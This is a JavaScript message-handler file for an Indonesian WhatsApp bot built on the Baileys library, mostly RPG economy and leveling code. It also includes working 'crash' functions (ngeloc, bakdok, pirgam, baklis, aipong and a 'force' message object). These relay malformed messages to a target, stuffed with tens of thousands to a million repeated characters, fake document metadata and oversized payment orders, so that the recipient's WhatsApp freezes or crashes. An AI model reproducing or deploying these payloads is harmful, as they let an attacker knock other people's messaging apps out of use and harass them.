//===================《 TEMPAT MODULE 》=====================\\
 require("./config")
 const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
 const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const { Client } = require('ssh2');
const moment = require('moment-timezone');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const CFonts = require('cfonts')
const cheerio = require('cheerio')
const puppeteer = require('puppeteer')
module.exports = async (Lily, m ,chatUpdate) => {
try {
const from = m.key.remoteJid
const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

//==================《 TEMPAT CONST LIB 》=====================\\
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
const { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require('./rpg/lib/lvlfunction')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi, kurangGajah, getIkan, getAyam, getKelinci, getDomba, getSapi, getGajah } = require('./storage/user/buruan')
let _name = JSON.parse(fs.readFileSync('./database/namerpg.json'));
const namerpg = require('./rpg/lib/namerpg')
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
//===================《 TAMPAT PREFIX / ADMIN / OWNER 》====================\\
const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const content = JSON.stringify(m.message)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Lily.user.id.split(':')[0]+'@s.whatsapp.net' || Lily.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Lily.decodeJid(Lily.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const time = moment().format("HH:mm:ss DD/MM");
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isBrave = namerpg.checkNameUser(sender, _name)
const isGroup = m.key.remoteJid.endsWith('@g.us')
const isAudio = (m.type == 'audioMessage')
const isQuotedAudio = m.type === 'extendedTextMessage' && content.includes('audioMessage')
const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);

const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await Lily.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''

const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//=================《 TEMPAT FUNCTION DATABASE 》====================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let _heal = JSON.parse(fs.readFileSync('./database/heal.json'))
let _potion = JSON.parse(fs.readFileSync('./database/potion.json'))
let _rplimit = JSON.parse(fs.readFileSync('./database/rplimit.json'))
const _money = JSON.parse(fs.readFileSync('./database/uang.json'))
let _level = JSON.parse(fs.readFileSync('./database/level.json'))
let _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
let _rumah = JSON.parse(fs.readFileSync('./database/Orangrpg.json'));
let healawal = "10" //Ini Bonus Daftar RP
let potionawal = "10" //Ini Bonus Daftar RP
let crystalawal = "1000" //Ini Bonus Daftar RP
let uangawal = "10000" //Ini Bonus Daftar RP
let userPotan = "100"
let rplimitawal = '25'//Ini Bonus Daftar RP
let rpliminya = 1 * 1
let tebakgambar = []
let tebakkata = []
//=================《 TEMPAT CONST DATABASE 》====================\\
const _crystal = JSON.parse(fs.readFileSync('./database/crystal.json'))
const rumahrpg = require('./rpg/lib/rumahrp')
//=================《 TEMPAT DARABASE RPG 》====================\\
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah }  = require('./storage/user/darah')
const { cekInventoryAdaAtauGak, addInventori, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion, getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('./storage/user/alat_tukar')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./storage/user/monay')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit } = require('./storage/user/limit')
//===================《 TAMPILAN CONSOLE 》=====================\\
if (m.message) {
console.log(chalk.green.bold("《 ") +
                        chalk.magenta.bold("Console By FallZx") +
                        chalk.green.bold(" 》 ") +
                        chalk.blue(time) +
                        " from " +
                        chalk.magenta.bold(pushname) +
                        " in " +
                        chalk.yellow.bold(groupName))
};
           

//==================《 FUNCTION FITUR 》=====================\\
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Lily.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 
function randomNomor(min, max = null) {
  if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
  } else {
return Math.floor(Math.random() * min) + 1
  }
}

const levelRole = getLevelingLevel(m.sender)
var role = 'Warrior III'
if (levelRole <= 5) {
    role = 'Warrior II'
} else if (levelRole <= 10) {
    role = 'Warrior I'
} else if (levelRole <= 15) {
    role = 'Elite III'
} else if (levelRole <= 20) {
    role = 'Elite II'
} else if (levelRole <= 25) {
    role = 'Elite I'
} else if (levelRole <= 30) {
    role = 'Master III'
} else if (levelRole <= 35) {
    role = 'Master II'
} else if (levelRole <= 40) {
    role = 'Master I'
} else if (levelRole <= 45) {
    role = 'GrandMaster III'
} else if (levelRole <= 50) {
    role = 'GrandMaster II'
} else if (levelRole <= 55) {
    role = 'GrandMaster I'
} else if (levelRole <= 60) {
    role = 'Epic III'
} else if (levelRole <= 65) {
    role = 'Epic II'
} else if (levelRole <= 70) {
    role = 'Epic I'
} else if (levelRole <= 75) {
    role = 'Legend III'
} else if (levelRole <= 80) {
    role = 'Legend II'
} else if (levelRole <= 85) {
    role = 'Legend I'
} else if (levelRole <= 90) {
    role = 'Mythic'
} else if (levelRole <= 95) {
    role = 'Mythical Glory'
} else if (levelRole >= 100) {
    role = 'Immortal'
} 
    async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: Lily.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Lily.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Lily.ev.emit('messages.upsert', msg)
    }
    async function LilyReply(txt) {
const Lilyrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Lily MD V1.3",
newsletterJid: "120363186130999681@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: global.botname,
body: global.pembuat,
thumbnailUrl: 'https://telegra.ph/file/ab739e452d96d094aec78.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return Lily.sendMessage(from, Lilyrep, {
quoted: m,
})
    }

const bayarHeal = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_heal[i].id === sender) {
  position = i
}
})
if (position !== false) {
_heal[position].heal -= amount
fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
}
    const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/leveluser.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/leveluser.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/leveluser.json', JSON.stringify(_level))
        }
    }
    const addHealUser = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_heal[i].id === sender) {
  position = i
}
})
if (position !== false) {
_heal[position].heal -= amount
fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
}
    }
    const healAdd = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_heal[i].id == sender) {
  position = i
}
})
if (position !== false) {
_heal[position].heal += amount
fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
}
    }
    const bayarPotion = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_potion[i].id === sender) {
  position = i
}
})
if (position !== false) {
_potion[position].potion -= amount
fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
}
    }
    const addPotioUser = (sender, amount) => {
let position = false
Object.keys(_potion).forEach((i) => {
if (_potion[i].id === sender) {
  position = i
}
})
if (position !== false) {
_potion[position].potion -= amount
fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
}
    }
    const potionAdd = (sender) => {
let position = false
Object.keys(_potion).forEach((i) => {
if (_potion[i].id == sender) {
  position = i
}
})
if (position !== false) {
_potion[position].potion += 1
fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
}
    }
    //function crystal 
    const bayarCrystal = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_crystal[i].id === sender) {
  position = i
}
})
if (position !== false) {
_crystal[position].crystal -= amount
fs.writeFileSync('./database/crystal.json', JSON.stringify(_crystal))
}
    }
    const addCrysUser = (sender, amount) => {
let position = false
Object.keys(_crystal).forEach((i) => {
if (_crystal[i].id === sender) {
  position = i
}
})
if (position !== false) {
_crystal[position].crystal -= amount
fs.writeFileSync('./database/crystal.json', JSON.stringify(_crystal))
}
    }
    const crystalAdd = (sender, amount) => {
let position = false
Object.keys(_crystal).forEach((i) => {
if (_crystal[i].id == sender) {
  position = i
}
})
if (position !== false) {
_crystal[position].crystal += amount
fs.writeFileSync('./database/crystal.json', JSON.stringify(_crystal))
}
    }
    const addLimUser = (sender, amount) => {
let position = false
Object.keys(_rplimit).forEach((i) => {
if (_rplimit[i].id === sender) {
  position = i
}
})
if (position !== false) {
_rplimit[position].rplimit += amount
fs.writeFileSync('./database/rplimit.json', JSON.stringify(_rplimit))
}
    }
    const rplimitAdd = (sender, amount) => {
let position = false
Object.keys(_rplimit).forEach((i) => {
if (_rplimit[i].id == sender) {
  position = i
}
})
if (position !== false) {
_rplimit[position].rplimit -= amount
fs.writeFileSync('./database/rplimit.json', JSON.stringify(_rplimit))
}
    }
const isPotion = (sender) => {
let position = false
for (let i of _potion) {
if (i.id === sender) {
  let potions = i.potion
  if (potions >= potionawal) {
    position = true
    Hikari.sendMessage(from, `Beli Gumption ${prefix}buygumption`, text, { quoted: fall })
    return true
  } else {
    _potion
    position = true
    return false
  }
}
}
if (position === false) {
const obj = { id: sender, potion: 0 }
_potion.push(obj)
fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
return false
}
    }
let fendh = false
for (let crystallmt of _crystal) {
if (crystallmt.id === sender) {
   userCrystal = crystalawal - crystallmt.crystal
  fendh = true
}
let fiundh = false
for (let potanlmt of _rplimit) {
if (potanlmt.id === sender) {
   userPotan = potanlmt.rplimit
  fiundh = true
}
}
    
}
if (fendh === false) {
let obj = { id: sender, crystal: 0 }
_crystal.push(obj)
fs.writeFileSync('./database/crystal.json', JSON.stringify(_crystal))
}
let fiendh = false
for (let potonlmt of _money) {
if (potonlmt.id === sender) {
   userPoton = potonlmt.money
  fiendh = true
}
}
if (fiendh === false) {
let obj = { id: sender, money: uangawal }
_money.push(obj)
fs.writeFileSync('./database/uang.json', JSON.stringify(_money))
}
    let fondh = false
for (let potionlmt of _potion) {
if (potionlmt.id === sender) {
   userPotion = potionawal - potionlmt.potion
  fondh = true
}
}
if (fondh === false) {
let obj = { id: sender, potion: 0 }
_potion.push(obj)
fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
} 
let fundh = false
for (let heallmt of _heal) {
if (heallmt.id === sender) {
  userHeal = healawal - heallmt.heal
  fundh = true
}
} 
if (fundh === false) {
let obj = { id: sender, heal: 0 }
_heal.push(obj)
fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
}
let fiundh = false
for (let potanlmt of _rplimit) {
if (potanlmt.id === sender) {
   userPotan = potanlmt.rplimit
  fiundh = true
}
}
//function adven
if (fiundh === false) {
let obj = { id: sender, rplimit: rplimitawal }
_rplimit.push(obj)
fs.writeFileSync('./database/rplimit.json', JSON.stringify(_rplimit))
}
const addUang = (sender, amount) => {
let position = false
Object.keys(_money).forEach((i) => {
if (_money[i].id === sender) {
  position = i
}
})
if (position !== false) {
_money[position].money += amount
fs.writeFileSync('./database/uang.json', JSON.stringify(_money))
}
    }
    const uangAdd = (sender, amount) => {
let position = false
Object.keys(_money).forEach((i) => {
if (_money[i].id == sender) {
  position = i
}
})
if (position !== false) {
_money[position].money -= amount
fs.writeFileSync('./database/uang.json', JSON.stringify(_money))
}
    }
const addMonUser = (sender, amount) => {
let position = false
Object.keys(money).forEach((i) => {
if (money[i].id === sender) {
  position = i
}
})
if (position !== false) {
money[position].money += amount
fs.writeFileSync('./uang.json', JSON.stringify(money))
}
    }
    
    const moneyAdd = (sender, amount) => {
let position = false
Object.keys(money).forEach((i) => {
if (money[i].id == sender) {
  position = i
}
})
if (position !== false) {
money[position].money -= amount
fs.writeFileSync('./uang.json', JSON.stringify(money))
}
    }
    const getMonUser = (sender) => {
let fiendh = false
for (let potonlmt of money) {
if (potonlmt.id === sender) {
   global.userPoton = potonlmt.money
  fiendh = true
  return global.userPoton
}
}
//function adven
if (fiendh === false) {
let obj = { id: sender, money: 0 }
money.push(obj)
fs.writeFileSync('./uang.json', JSON.stringify(money))
}
}

orang = 'Tidak Mampu'
cekrumah = rumahrpg.getOrangId(sender, _rumah)
getrumah = rumahrpg.getOrangReason(cekrumah, _rumah)
if(getrumah === 'Tidak Punya') {
orang = 'Tidak Mampu'
}
if(getrumah === 'Rumah Kayu') {
orang = 'Orang Miskin'
}
if(getrumah === 'Rumah Mewah') {
orang = 'Orang Kaya'
}
if(getrumah === 'Kerajaan') {
orang = 'Seorang Raja'
}
if(getrumah === 'Rumah Biasa') {
orang = 'Orang Biasa'
}
if(orang === 'Orang Miskin') {
myHouse = 'https://telegra.ph/file/104e2616e7d6fe783cf7b.jpg' 
}
if(orang === 'Orang Biasa') {
myHouse = 'https://telegra.ph/file/d946f00abda9b0cc6ebc2.jpg'
}
if(orang === 'Orang Kaya') {
myHouse = 'https://telegra.ph/file/d0ac09ed624e2e8413c57.jpg'
}
if(orang === 'Seorang Raja') {
myHouse = 'https://telegra.ph/file/56bca19855844c2a1b4dc.jpg'
}
// respon list 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Lily.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Lily.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
const lilybot = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ`
}
}
}
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./img/Lily.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
//=================================================//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ︎`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Lily.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    async function sendNglMessage(url, message) {
  const browser = await puppeteer.launch({ headless: true })
  const page = await browser.newPage()
  await page.goto(url, { waitUntil: 'networkidle2' })
  await page.type('textarea#question', message)
  await page.click('button[type="submit"]')
  await page.waitForTimeout(3000)
  const resultUrl = page.url()
  await browser.close()
  return resultUrl
    }
//=================================================//
async function aipong(target) {
await Lily.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ︎`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await Lily.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await Lily.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ︎",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: Lily.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #ryozingoddominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await Lily.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Lily.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Lily.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}    
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "࿋ོ༙𝑳𝒊𝒍𝒚 𝑴𝒅𝒛 ཽ ྀ"+" ".repeat(920000),
        'footerText': `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ︎`,
        'description': `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ︎`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: lilybot });
await Lily.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

//self public
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}

//===================《 FUNCTION REPLY 》=====================\\


const reply = (teks) => { 
Lily.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Hilarry Abigail", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://whatsapp.com/channel/0029VaBOlsv002TEjlntTE2D", 
"sourceUrl": "https://whatsapp.com/channel/0029VaBOlsv002TEjlntTE2D" }}}, { quoted: m }) }

const reply2 = (teks) => {
Lily.sendMessage(from, { text : teks }, { quoted : m })
}

//==================《 FUNCTION WAKTU 》======================\\
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
    async function HariLibur() {
  try {
    const response = await fetch("https://www.liburnasional.com/")
    const cheerio = require('cheerio')
    const html = await response.text()
    const $ = cheerio.load(html)
    const nextLibur = $("div.row.row-alert > div").text().split("Hari libur")[1]?.trim() || "Tidak ada informasi"
    const libnas_content = $("tbody > tr").map((index, element) => {
      const summary = $(element).find("span > strong > a").text() || "Tidak ada informasi"
      const days = $(element).find("div.libnas-calendar-holiday-weekday").text() || "Tidak ada informasi"
      const dateMonth = $(element).find("time.libnas-calendar-holiday-datemonth").text() || "Tidak ada informasi"
      return {
        summary: summary,
        days: days,
        dateMonth: dateMonth
      }
    }).get()

    return {
      nextLibur: nextLibur,
      libnas_content: libnas_content
    }
  } catch (error) {
    console.error("Logs:", error)
    throw error
  }
    }

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
